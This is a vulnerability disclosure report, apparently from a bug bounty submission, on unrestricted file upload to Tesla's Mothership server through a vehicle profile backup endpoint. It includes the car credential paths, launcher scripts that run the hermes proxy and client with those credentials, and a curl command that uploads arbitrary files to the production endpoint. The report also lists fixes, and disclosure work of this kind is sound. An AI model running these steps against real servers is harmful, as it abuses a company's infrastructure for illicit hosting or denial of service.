# Upload any File to Mothership via Profile Backup Service

| | |
|---|---|
| **CVE** | None (Tesla marked N/A — "working as intended") |
| **CWE** | CWE-434 (Unrestricted Upload of File), CWE-862 (Missing Authorization) |
| **Submitted** | September 4, 2021 |
| **Affected** | Tesla Mothership server (tested on Model 3, likely all vehicles) |
| **Kernel** | Linux ice 4.14.235-PLK #1 SMP PREEMPT (x86_64) |
| **Firmware** | 2021.24.4 |
| **Status** | Marked N/A by Tesla |
| **Reward** | No reward issued |

## Testing Environment

| Field | Value |
|-------|-------|
| Vehicle | Tesla Model 3 |
| MCU | Intel Atom (x86_64) |
| Kernel | 4.14.235-PLK |
| Firmware | 2021.24.4 |
| Access | Root shell or local machine with car certificates |
| Network | Internet connectivity via car or local hermes_proxy |
| Date | September 2021 |

## Description

Any individual who has obtained a copy of their car's certificates can run `hermes_proxy` and upload arbitrary data to Tesla's Mothership server using the profile backup service endpoint:

```
http://mothership.vn.teslamotors.com:4567/vehicles/${VIN}/computer_profile
```

The certificates required are located at:

```
/var/lib/car_creds/car.crt
/var/lib/car_creds/car.key
/var/lib/car_creds/device.crt
```

Alternatively, having root access on a vehicle enables skipping the local hermes setup entirely, as the vehicle is already running the hermes_proxy service.

## Steps for Reproduction

### 1. Set up the Hermes proxy

To run hermes_proxy on a local machine using the car's certificates, a modified launcher script is needed. The script configures the hermes environment with the car's credentials and Tesla's production server endpoints:

<details>
<summary>Hermes proxy launcher (hp.sh)</summary>

```bash
#!/bin/bash
HERMES_BIN_DIR=/opt/hermes
HERMES_SOCKET_PATH=/tmp/hermes.sock
HERMES_GRABLOGS_SOCKET_PATH=/tmp/grablogs_http.sock
HERMES_PACKET_SIZE=200000 #~200KB
HERMES_NICE=0
HERMES_USER=root
HERMES_GROUP=hermes
HERMES_GROUPS=$HERMES_GROUP
HERMES_ENABLE_CONNMAN=false
HERMES_LAZY_CONNECTION=true
HERMES_CONNMAN_IGNORE=none
HERMES_LOG_LEVEL=info
HERMES_ENABLE_COMMAND_ROUTER=false
HERMES_DISABLE_CONNMAN_FILE=/var/lib/hermes_vehicle_client/connman
HERMES_RETRY_STRATEGY=backoff
HERMES_SIGNATURE_PUB_KEYS=/etc/carserver-pub-keys/production.json
HERMES_CARAPI_DBUS_METHODS=/etc/carapi_dbus_methods.json
RUNIT_JOB=${PWD##*/}

if [ -f "$HERMES_DISABLE_CONNMAN_FILE" ]; then
    HERMES_ENABLE_CONNMAN=false
    HERMES_LAZY_CONNECTION=false
fi

. /etc/tesla-certificates.vars
HERMES_CREDS_DIR=/var/lib/car_creds
HERMES_ENV=prd
HERMES_CA=$TESLA_CERTIFICATES_COMBINED_SERVICES_PRD
HERMES_CMD_SERVER="wss://hermes-prd.vn.tesla.services:443"
HERMES_STREAM_SERVER="wss://hermes-stream-prd.vn.tesla.services:443/v2"
HERMES_API_SERVER="api-prd.vn.tesla.services"

HERMES_PRODUCTS_CA=$TESLA_CERTIFICATES_COMBINED_PRODUCTS
HERMES_CERT=$HERMES_CREDS_DIR/car.crt
HERMES_CERT_GROUP=car-creds
HERMES_CERT_GID=$(grep "^$HERMES_CERT_GROUP:" /etc/group | cut -d: -f3)
HERMES_DEVICE_CERT=$HERMES_CREDS_DIR/device.crt
HERMES_KEY=$HERMES_CREDS_DIR/car.key

if grep -q "BEGIN TSS2 PRIVATE KEY" "$HERMES_KEY"; then
    HERMES_ENGINE="--engine=tpm2tss"
fi

HERMES_APP=hermes_proxy
HERMES_USER=hermes-proxy
HERMES_GROUPS="$HERMES_GROUPS:$HERMES_CERT_GROUP:tss:dvreader"
HERMES_APPARMOR_POLICY="opt.hermes.hermes_proxy"
HERMES_OPTS="--ca=$HERMES_CA --cert=$HERMES_CERT --key=$HERMES_KEY \
    --api-server-host=$HERMES_API_SERVER \
    --unix-socket-buffer=$HERMES_PACKET_SIZE \
    --http-signature-pub-keys=$HERMES_SIGNATURE_PUB_KEYS \
    $HERMES_ENGINE --enable-dbus \
    --carapi-dbus-methods=$HERMES_CARAPI_DBUS_METHODS"

HERMES_EXEC="exec chpst -n$HERMES_NICE -u$HERMES_USER:$HERMES_GROUPS \
    $HERMES_BIN_DIR/$HERMES_APP --log-level=$HERMES_LOG_LEVEL"

echo $HERMES_EXEC $HERMES_OPTS
$HERMES_EXEC $HERMES_OPTS "$@"
```

</details>

<details>
<summary>Hermes client launcher (hc.sh)</summary>

```bash
#!/bin/bash
HERMES_BIN_DIR=/opt/hermes
HERMES_SOCKET_PATH=/tmp/hermes.sock
HERMES_GRABLOGS_SOCKET_PATH=/tmp/grablogs_http.sock
HERMES_PACKET_SIZE=200000 #~200KB
HERMES_NICE=0
HERMES_USER=root
HERMES_GROUP=hermes
HERMES_GROUPS=$HERMES_GROUP
HERMES_ENABLE_CONNMAN=false
HERMES_LAZY_CONNECTION=true
HERMES_CONNMAN_IGNORE=none
HERMES_LOG_LEVEL=info
HERMES_ENABLE_COMMAND_ROUTER=false
HERMES_DISABLE_CONNMAN_FILE=/var/lib/hermes_vehicle_client/connman
HERMES_RETRY_STRATEGY=backoff
HERMES_SIGNATURE_PUB_KEYS=/etc/carserver-pub-keys/production.json
HERMES_CARAPI_DBUS_METHODS=/etc/carapi_dbus_methods.json
RUNIT_JOB=${PWD##*/}

if [ -f "$HERMES_DISABLE_CONNMAN_FILE" ]; then
    HERMES_ENABLE_CONNMAN=false
    HERMES_LAZY_CONNECTION=false
fi

. /etc/tesla-certificates.vars
HERMES_CREDS_DIR=/var/lib/car_creds
HERMES_ENV=prd
HERMES_CA=$TESLA_CERTIFICATES_COMBINED_SERVICES_PRD
HERMES_CMD_SERVER="wss://hermes-prd.vn.tesla.services:443"
HERMES_STREAM_SERVER="wss://hermes-stream-prd.vn.tesla.services:443/v2"
HERMES_API_SERVER="api-prd.vn.tesla.services"

HERMES_PRODUCTS_CA=$TESLA_CERTIFICATES_COMBINED_PRODUCTS
HERMES_CERT=$HERMES_CREDS_DIR/car.crt
HERMES_CERT_GROUP=car-creds
HERMES_CERT_GID=$(grep "^$HERMES_CERT_GROUP:" /etc/group | cut -d: -f3)
HERMES_DEVICE_CERT=$HERMES_CREDS_DIR/device.crt
HERMES_KEY=$HERMES_CREDS_DIR/car.key

if grep -q "BEGIN TSS2 PRIVATE KEY" "$HERMES_KEY"; then
    HERMES_ENGINE="--engine=tpm2tss"
fi

HERMES_APP=hermes_client
HERMES_USER=hermes-client
HERMES_GROUPS="$HERMES_GROUPS:$HERMES_CERT_GROUP:tss:log"
HERMES_APPARMOR_POLICY="opt.hermes.hermes_client"
export HERMES_CERT_GID=$HERMES_CERT_GID
HERMES_SOCKET_UID=$(id -u $HERMES_USER)
HERMES_SOCKET_GID=$(grep "^$HERMES_GROUP:" /etc/group | cut -d: -f3)
HERMES_OPTS="--ca=$HERMES_CA --products-ca=$HERMES_PRODUCTS_CA \
    --cert=$HERMES_CERT --key=$HERMES_KEY \
    --hermes-command-server=$HERMES_CMD_SERVER \
    --hermes-stream-server=$HERMES_STREAM_SERVER \
    --secondary-cert=$HERMES_DEVICE_CERT \
    --enable-connman=$HERMES_ENABLE_CONNMAN \
    --lazy-connection=$HERMES_LAZY_CONNECTION \
    --connman-ignore-interfaces=$HERMES_CONNMAN_IGNORE \
    --enable-phone-home \
    --unix-socket-buffer=$HERMES_PACKET_SIZE \
    --retry-strategy=$HERMES_RETRY_STRATEGY \
    --socket-path=$HERMES_SOCKET_PATH \
    --socket-uid=$HERMES_SOCKET_UID \
    --socket-gid=$HERMES_SOCKET_GID \
    --enable-cmd-router-dbus=$HERMES_ENABLE_COMMAND_ROUTER \
    $HERMES_ENGINE"

HERMES_EXEC="exec chpst -n$HERMES_NICE -u$HERMES_USER:$HERMES_GROUPS \
    $HERMES_BIN_DIR/$HERMES_APP --log-level=$HERMES_LOG_LEVEL"

echo $HERMES_EXEC $HERMES_OPTS
$HERMES_EXEC $HERMES_OPTS "$@"
```

</details>

### 2. Upload arbitrary data

Once hermes_proxy is running (either via the scripts above or natively on a rooted vehicle), upload any file to Mothership:

```bash
curl -s --connect-timeout 3 --retry 3 --retry-max-time 20 \
    -X PUT \
    -F "file@pirated_movie.mp4" \
    -H "Content-Type: multipart/form-data" \
    "http://mothership.vn.teslamotors.com:4567/vehicles/${VIN}/computer_profile"
```

The VIN must match the certificates used to start hermes_proxy. Once the command completes, the data is stored on Tesla's servers.

## Impact

- **Illegal data hosting:** Tesla's Mothership servers could be used as a backup service for illegal data sharing, potentially creating unintended legal liability for Tesla.
- **Denial of service:** Flooding the Mothership servers with extremely large amounts of data could increase server costs or cause crashes. Large-volume uploads were not tested.

## Recommendations

- Implement file type and size validation on the profile backup endpoint.
- Add rate limiting to prevent abuse.
- Require additional authentication or signing beyond the car's transport-layer certificates.

---

**Researchers:** Matthew C. Pilsbury, Alex Harbuzenko, Oleg Kutkov
Research conducted at SourceHat Labs Inc.
